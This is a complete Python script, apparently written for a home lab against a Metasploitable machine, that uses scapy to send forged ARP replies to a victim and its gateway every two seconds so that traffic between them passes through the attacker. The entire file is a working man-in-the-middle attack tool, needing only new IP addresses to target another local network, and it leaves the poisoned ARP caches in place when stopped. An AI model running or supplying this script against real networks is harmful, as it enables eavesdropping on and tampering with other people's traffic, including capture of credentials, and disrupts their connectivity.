#!/usr/bin/env python3

from scapy.all import ARP, Ether, sendp, getmacbyip
import time
import sys

victim_ip = "192.168.1.121"   # Metasploitable
gateway_ip = "192.168.1.1"    # OPNsense
interface = "eth0"


def spoof(target_ip, spoofed_ip):
    # Send a forged ARP reply.
    # target_ip  = machine receiving the fake ARP reply
    # spoofed_ip = IP address we are pretending to be

    target_mac = getmacbyip(target_ip)

    if target_mac is None:
        print(f"[!] Could not find MAC address for {target_ip}")
        return

    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoofed_ip
    )

    sendp(packet, iface=interface, verbose=False)


try:
    print("[*] Starting ARP spoofing.")
    print(f"[*] Victim:  {victim_ip}")
    print(f"[*] Gateway: {gateway_ip}")
    print("[*] Press Ctrl+C to stop.\n")

    while True:
        spoof(victim_ip, gateway_ip)
        spoof(gateway_ip, victim_ip)
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[*] Stopping ARP spoofing.")
    sys.exit(0)
